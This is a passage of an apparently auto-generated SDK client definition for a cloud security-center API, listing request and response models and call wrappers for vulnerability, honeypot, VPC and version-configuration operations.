  vendorNameList?: [ string ](name='VendorNameList'),
}

model DescribeVendorListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVendorListResponseBody(name='body'),
}

async function describeVendorListWithOptions(runtime: Util.RuntimeOptions): DescribeVendorListResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeVendorList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVendorList(): DescribeVendorListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVendorListWithOptions(runtime);
}

model DescribeVersionConfigRequest {
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeVersionConfigResponseBody = {
  allowPartialBuy?: int32(name='AllowPartialBuy'),
  appWhiteList?: int32(name='AppWhiteList'),
  appWhiteListAuthCount?: long(name='AppWhiteListAuthCount'),
  assetLevel?: int32(name='AssetLevel'),
  highestVersion?: int32(name='HighestVersion'),
  honeypotCapacity?: long(name='HoneypotCapacity'),
  imageScanCapacity?: long(name='ImageScanCapacity'),
  instanceId?: string(name='InstanceId'),
  isNewContainerVersion?: boolean(name='IsNewContainerVersion'),
  isOverBalance?: boolean(name='IsOverBalance'),
  isTrialVersion?: int32(name='IsTrialVersion'),
  lastTrailEndTime?: long(name='LastTrailEndTime'),
  MVAuthCount?: int32(name='MVAuthCount'),
  MVUnusedAuthCount?: int32(name='MVUnusedAuthCount'),
  openTime?: long(name='OpenTime'),
  releaseTime?: long(name='ReleaseTime'),
  requestId?: string(name='RequestId'),
  sasLog?: int32(name='SasLog'),
  sasScreen?: int32(name='SasScreen'),
  slsCapacity?: long(name='SlsCapacity'),
  threatAnalysisCapacity?: long(name='ThreatAnalysisCapacity'),
  userDefinedAlarms?: int32(name='UserDefinedAlarms'),
  version?: int32(name='Version'),
  vmCores?: int32(name='VmCores'),
  webLock?: int32(name='WebLock'),
  webLockAuthCount?: long(name='WebLockAuthCount'),
}

model DescribeVersionConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVersionConfigResponseBody(name='body'),
}

async function describeVersionConfigWithOptions(request: DescribeVersionConfigRequest, runtime: Util.RuntimeOptions): DescribeVersionConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVersionConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVersionConfig(request: DescribeVersionConfigRequest): DescribeVersionConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVersionConfigWithOptions(request, runtime);
}

model DescribeVpcHoneyPotCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name'),
      type?: string(name='Type'),
      values?: string(name='Values'),
    }
  ](name='CriteriaList'),
  requestId?: string(name='RequestId'),
}

model DescribeVpcHoneyPotCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVpcHoneyPotCriteriaResponseBody(name='body'),
}

async function describeVpcHoneyPotCriteriaWithOptions(runtime: Util.RuntimeOptions): DescribeVpcHoneyPotCriteriaResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeVpcHoneyPotCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVpcHoneyPotCriteria(): DescribeVpcHoneyPotCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVpcHoneyPotCriteriaWithOptions(runtime);
}

model DescribeVpcHoneyPotListRequest {
  currentPage?: int32(name='CurrentPage'),
  honeyPotExistence?: boolean(name='HoneyPotExistence'),
  pageSize?: int32(name='PageSize'),
  vpcId?: string(name='VpcId'),
  vpcName?: string(name='VpcName'),
  vpcRegionId?: string(name='VpcRegionId'),
}

model DescribeVpcHoneyPotListResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  vpcHoneyPotDTOList?: [ 
    {
      cidrBlock?: string(name='CidrBlock'),
      createTime?: long(name='CreateTime'),
      honeyPotEcsInstanceStatus?: string(name='HoneyPotEcsInstanceStatus'),
      honeyPotEniInstanceId?: string(name='HoneyPotEniInstanceId'),
      honeyPotExistence?: boolean(name='HoneyPotExistence'),
      honeyPotInstanceStatus?: string(name='HoneyPotInstanceStatus'),
      honeyPotVpcSwitchId?: string(name='HoneyPotVpcSwitchId'),
      vpcId?: string(name='VpcId'),
      vpcName?: string(name='VpcName'),
      vpcRegionId?: string(name='VpcRegionId'),
      vpcStatus?: string(name='VpcStatus'),
      vpcSwitchIdList?: [ 
        {
          vpcSwitchId?: string(name='VpcSwitchId'),
          vpcSwitchName?: string(name='VpcSwitchName'),
          zoneId?: string(name='ZoneId'),
        }
      ](name='VpcSwitchIdList'),
    }
  ](name='VpcHoneyPotDTOList'),
}

model DescribeVpcHoneyPotListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVpcHoneyPotListResponseBody(name='body'),
}

async function describeVpcHoneyPotListWithOptions(request: DescribeVpcHoneyPotListRequest, runtime: Util.RuntimeOptions): DescribeVpcHoneyPotListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.honeyPotExistence)) {
    query['HoneyPotExistence'] = request.honeyPotExistence;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  if (!Util.isUnset(request.vpcName)) {
    query['VpcName'] = request.vpcName;
  }
  if (!Util.isUnset(request.vpcRegionId)) {
    query['VpcRegionId'] = request.vpcRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVpcHoneyPotList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVpcHoneyPotList(request: DescribeVpcHoneyPotListRequest): DescribeVpcHoneyPotListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVpcHoneyPotListWithOptions(request, runtime);
}

model DescribeVpcListResponseBody = {
  count?: int32(name='Count'),
  requestId?: string(name='RequestId'),
  vpcList?: [ 
    {
      ecsCount?: int32(name='EcsCount'),
      instanceDesc?: string(name='InstanceDesc'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      regionId?: string(name='RegionId'),
    }
  ](name='VpcList'),
}

model DescribeVpcListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVpcListResponseBody(name='body'),
}

async function describeVpcListWithOptions(runtime: Util.RuntimeOptions): DescribeVpcListResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeVpcList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVpcList(): DescribeVpcListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVpcListWithOptions(runtime);
}

model DescribeVulCheckTaskStatusDetailRequest {
  taskIds?: [ string ](name='TaskIds'),
  types?: [ string ](name='Types'),
  uuid?: string(name='Uuid'),
}

model DescribeVulCheckTaskStatusDetailResponseBody = {
  requestId?: string(name='RequestId'),
  taskStatuses?: [ 
    {
      taskId?: string(name='TaskId'),
      taskStatusList?: [ 
        {
          code?: string(name='Code'),
          status?: string(name='Status'),
          type?: string(name='Type'),
        }
      ](name='TaskStatusList'),
    }
  ](name='TaskStatuses'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeVulCheckTaskStatusDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulCheckTaskStatusDetailResponseBody(name='body'),
}

async function describeVulCheckTaskStatusDetailWithOptions(request: DescribeVulCheckTaskStatusDetailRequest, runtime: Util.RuntimeOptions): DescribeVulCheckTaskStatusDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskIds)) {
    query['TaskIds'] = request.taskIds;
  }
  if (!Util.isUnset(request.types)) {
    query['Types'] = request.types;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulCheckTaskStatusDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulCheckTaskStatusDetail(request: DescribeVulCheckTaskStatusDetailRequest): DescribeVulCheckTaskStatusDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulCheckTaskStatusDetailWithOptions(request, runtime);
}

model DescribeVulConfigRequest {
  sourceIp?: string(name='SourceIp'),
  type?: string(name='Type'),
}

model DescribeVulConfigResponseBody = {
  requestId?: string(name='RequestId'),
  targetConfigs?: [ 
    {
      config?: string(name='Config'),
      overAllConfig?: string(name='OverAllConfig'),
      type?: string(name='Type'),
    }
  ](name='TargetConfigs'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeVulConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulConfigResponseBody(name='body'),
}

async function describeVulConfigWithOptions(request: DescribeVulConfigRequest, runtime: Util.RuntimeOptions): DescribeVulConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulConfig(request: DescribeVulConfigRequest): DescribeVulConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulConfigWithOptions(request, runtime);
}

model DescribeVulDetailsRequest {
  aliasName?: string(name='AliasName'),
  lang?: string(name='Lang'),
  name?: string(name='Name'),
  type?: string(name='Type'),
}

model DescribeVulDetailsResponseBody = {
  cves?: [ 
    {
      classify?: string(name='Classify'),
      classifys?: [ 
        {
          classify?: string(name='Classify'),
          demoVideoUrl?: string(name='DemoVideoUrl'),
          description?: string(name='Description'),
        }
      ](name='Classifys'),
      cnvdId?: string(name='CnvdId'),
      complexity?: string(name='Complexity'),
      content?: string(name='Content'),
      cveId?: string(name='CveId'),
      cvssScore?: string(name='CvssScore'),
      cvssVector?: string(name='CvssVector'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      poc?: string(name='Poc'),
      pocCreateTime?: long(name='PocCreateTime'),
      pocDisclosureTime?: long(name='PocDisclosureTime'),
      product?: string(name='Product'),
      reference?: string(name='Reference'),
      releaseTime?: long(name='ReleaseTime'),
      solution?: string(name='Solution'),
      summary?: string(name='Summary'),
      targetId?: string(name='TargetId'),
      targetName?: string(name='TargetName'),
      title?: string(name='Title'),
      vendor?: string(name='Vendor'),
      vulLevel?: string(name='VulLevel'),
    }
  ](name='Cves'),
  requestId?: string(name='RequestId'),
}

model DescribeVulDetailsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulDetailsResponseBody(name='body'),
}

async function describeVulDetailsWithOptions(request: DescribeVulDetailsRequest, runtime: Util.RuntimeOptions): DescribeVulDetailsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulDetails',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulDetails(request: DescribeVulDetailsRequest): DescribeVulDetailsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulDetailsWithOptions(request, runtime);
}

model DescribeVulExportInfoRequest {
  exportId?: long(name='ExportId'),
}

model DescribeVulExportInfoResponseBody = {
  currentCount?: int32(name='CurrentCount'),
  exportStatus?: string(name='ExportStatus'),
  fileName?: string(name='FileName'),
  id?: long(name='Id'),
  link?: string(name='Link'),
  message?: string(name='Message'),
  progress?: int32(name='Progress'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeVulExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulExportInfoResponseBody(name='body'),
}

async function describeVulExportInfoWithOptions(request: DescribeVulExportInfoRequest, runtime: Util.RuntimeOptions): DescribeVulExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulExportInfo(request: DescribeVulExportInfoRequest): DescribeVulExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulExportInfoWithOptions(request, runtime);
}

model DescribeVulFixStatisticsResponseBody = {
  fixStat?: [ 
    {
      fixedTodayNum?: int32(name='FixedTodayNum'),
      fixedTotalNum?: int32(name='FixedTotalNum'),
      fixingNum?: int32(name='FixingNum'),
      needFixNum?: int32(name='NeedFixNum'),
      type?: string(name='Type'),
    }
  ](name='FixStat'),
  fixTotal?: {
    fixedTodayNum?: int32(name='FixedTodayNum'),
    fixedTotalNum?: int32(name='FixedTotalNum'),
    fixingNum?: int32(name='FixingNum'),
    needFixNum?: int32(name='NeedFixNum'),
  }(name='FixTotal'),
  requestId?: string(name='RequestId'),
}

model DescribeVulFixStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulFixStatisticsResponseBody(name='body'),
}

async function describeVulFixStatisticsWithOptions(runtime: Util.RuntimeOptions): DescribeVulFixStatisticsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeVulFixStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulFixStatistics(): DescribeVulFixStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulFixStatisticsWithOptions(runtime);
}

model DescribeVulListRequest {
  aliasName?: string(name='AliasName'),
  attachTypes?: string(name='AttachTypes'),
  currentPage?: int32(name='CurrentPage'),
  dealed?: string(name='Dealed'),
  groupId?: string(name='GroupId'),
  lang?: string(name='Lang'),
  name?: string(name='Name'),
  necessity?: string(name='Necessity'),
  pageSize?: int32(name='PageSize'),
  remark?: string(name='Remark'),
  type?: string(name='Type'),
  uuids?: string(name='Uuids'),
  vpcInstanceIds?: string(name='VpcInstanceIds'),
}

model DescribeVulListResponseBody = {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
  vulRecords?: [ 
    {
      aliasName?: string(name='AliasName'),
      authVersion?: string(name='AuthVersion'),
      bind?: boolean(name='Bind'),
      extendContentJson?: {
        absolutePath?: string(name='AbsolutePath'),
        aliasName?: string(name='AliasName'),
        description?: string(name='Description'),
        ip?: string(name='Ip'),
        lastTs?: long(name='LastTs'),
        necessity?: {
          assetsFactor?: string(name='Assets_factor'),
          cvssFactor?: string(name='Cvss_factor'),
          enviromentFactor?: string(name='Enviroment_factor'),
          isCalc?: string(name='Is_calc'),
          status?: string(name='Status'),
          timeFactor?: string(name='Time_factor'),
          totalScore?: string(name='Total_score'),
        }(name='Necessity'),
        os?: string(name='Os'),
        osRelease?: string(name='OsRelease'),
        primaryId?: long(name='PrimaryId'),
        rpmEntityList?: [ 
          {
            containerName?: string(name='ContainerName'),
            fullVersion?: string(name='FullVersion'),
            imageName?: string(name='ImageName'),
            matchDetail?: string(name='MatchDetail'),
            matchList?: [ string ](name='MatchList'),
            name?: string(name='Name'),
            path?: string(name='Path'),
            pid?: string(name='Pid'),
            updateCmd?: string(name='UpdateCmd'),
            version?: string(name='Version'),
          }
        ](name='RpmEntityList'),
        status?: string(name='Status'),
        tag?: string(name='Tag'),
        cveList?: [ string ](name='cveList'),
      }(name='ExtendContentJson'),
      firstTs?: long(name='FirstTs'),
      groupId?: int32(name='GroupId'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      lastTs?: long(name='LastTs'),
      modifyTs?: long(name='ModifyTs'),
      name?: string(name='Name'),
      necessity?: string(name='Necessity'),
      online?: boolean(name='Online'),
      osName?: string(name='OsName'),
      osVersion?: string(name='OsVersion'),
      primaryId?: long(name='PrimaryId'),
      regionId?: string(name='RegionId'),
      related?: string(name='Related'),
      repairTs?: long(name='RepairTs'),
      resultCode?: string(name='ResultCode'),
      resultMessage?: string(name='ResultMessage'),
      status?: int32(name='Status'),
      tag?: string(name='Tag'),
      type?: string(name='Type'),
      uuid?: string(name='Uuid'),
    }
  ](name='VulRecords'),
}

model DescribeVulListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulListResponseBody(name='body'),
}

async function describeVulListWithOptions(request: DescribeVulListRequest, runtime: Util.RuntimeOptions): DescribeVulListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.attachTypes)) {
    query['AttachTypes'] = request.attachTypes;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  if (!Util.isUnset(request.vpcInstanceIds)) {
    query['VpcInstanceIds'] = request.vpcInstanceIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulList(request: DescribeVulListRequest): DescribeVulListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulListWithOptions(request, runtime);
}

model DescribeVulListPageRequest {
  currentPage?: int32(name='CurrentPage'),
  cveId?: string(name='CveId'),
  pageSize?: int32(name='PageSize'),
  vulNameLike?: string(name='VulNameLike'),
}

model DescribeVulListPageResponseBody = {
  data?: [ 
    {
      cveId?: string(name='CveId'),
      extAegis?: string(name='ExtAegis'),
      id?: long(name='Id'),
      isAegis?: int32(name='IsAegis'),
      isSas?: int32(name='IsSas'),
      otherId?: string(name='OtherId'),
      releaseTime?: long(name='ReleaseTime'),
      title?: string(name='Title'),
    }
  ](name='Data'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeVulListPageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulListPageResponseBody(name='body'),
}

async function describeVulListPageWithOptions(request: DescribeVulListPageRequest, runtime: Util.RuntimeOptions): DescribeVulListPageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.cveId)) {
    query['CveId'] = request.cveId;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.vulNameLike)) {
    query['VulNameLike'] = request.vulNameLike;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulListPage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulListPage(request: DescribeVulListPageRequest): DescribeVulListPageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulListPageWithOptions(request, runtime);
}

model DescribeVulNumStatisticsRequest {
  from?: string(name='From'),
}

model DescribeVulNumStatisticsResponseBody = {
  appCnt?: int32(name='AppCnt'),
  appNum?: int32(name='AppNum'),
  cmsDealedTotalNum?: int32(name='CmsDealedTotalNum'),
  cmsNum?: int32(name='CmsNum'),
  cveNum?: int32(name='CveNum'),
  emgNum?: int32(name='EmgNum'),
  requestId?: string(name='RequestId'),
  scaNum?: int32(name='ScaNum'),
  sysNum?: int32(name='SysNum'),
  vulAsapSum?: int32(name='VulAsapSum'),
  vulDealedTotalNum?: int32(name='VulDealedTotalNum'),
  vulLaterSum?: int32(name='VulLaterSum'),
  vulNntfSum?: int32(name='VulNntfSum'),
}

model DescribeVulNumStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulNumStatisticsResponseBody(name='body'),
}

async function describeVulNumStatisticsWithOptions(request: DescribeVulNumStatisticsRequest, runtime: Util.RuntimeOptions): DescribeVulNumStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulNumStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulNumStatistics(request: DescribeVulNumStatisticsRequest): DescribeVulNumStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulNumStatisticsWithOptions(request, runtime);
}

model DescribeVulTargetConfigRequest {
  type?: string(name='Type'),
  uuid?: string(name='Uuid'),
}

model DescribeVulTargetConfigResponseBody = {
  requestId?: string(name='RequestId'),
  targetConfigs?: [ 
    {
      config?: string(name='Config'),
      overAllConfig?: string(name='OverAllConfig'),
      type?: string(name='Type'),
    }
  ](name='TargetConfigs'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeVulTargetConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulTargetConfigResponseBody(name='body'),
}

async function describeVulTargetConfigWithOptions(request: DescribeVulTargetConfigRequest, runtime: Util.RuntimeOptions): DescribeVulTargetConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulTargetConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulTargetConfig(request: DescribeVulTargetConfigRequest): DescribeVulTargetConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulTargetConfigWithOptions(request, runtime);
}

model DescribeVulTargetStatisticsRequest {
  type?: string(name='Type'),
}

model DescribeVulTargetStatisticsResponseBody = {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  targetStats?: [ 
    {
      targets?: [ 
        {
          flag?: string(name='Flag'),
          target?: string(name='Target'),
          targetType?: string(name='TargetType'),
        }
      ](name='Targets'),
      totalCount?: int32(name='TotalCount'),
      uuidCount?: int32(name='UuidCount'),
      vulType?: string(name='VulType'),
    }
  ](name='TargetStats'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeVulTargetStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulTargetStatisticsResponseBody(name='body'),
}

async function describeVulTargetStatisticsWithOptions(request: DescribeVulTargetStatisticsRequest, runtime: Util.RuntimeOptions): DescribeVulTargetStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulTargetStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulTargetStatistics(request: DescribeVulTargetStatisticsRequest): DescribeVulTargetStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulTargetStatisticsWithOptions(request, runtime);
}

model DescribeVulWhitelistRequest {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
}

model DescribeVulWhitelistResponseBody = {
  count?: int32(name='Count'),
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
  vulWhitelists?: [ 
    {
      aliasName?: string(name='AliasName'),
      id?: string(name='Id'),
      name?: string(name='Name'),
      reason?: string(name='Reason'),
      targetInfo?: string(name='TargetInfo'),
      type?: string(name='Type'),
      whitelist?: string(name='Whitelist'),
    }
  ](name='VulWhitelists'),
}

model DescribeVulWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulWhitelistResponseBody(name='body'),
}

async function describeVulWhitelistWithOptions(request: DescribeVulWhitelistRequest, runtime: Util.RuntimeOptions): DescribeVulWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulWhitelist(request: DescribeVulWhitelistRequest): DescribeVulWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulWhitelistWithOptions(request, runtime);
}

model DescribeWarningExportInfoRequest {
  exportId?: long(name='ExportId'),
}

model DescribeWarningExportInfoResponseBody = {
  currentCount?: int32(name='CurrentCount'),
  exportStatus?: string(name='ExportStatus'),
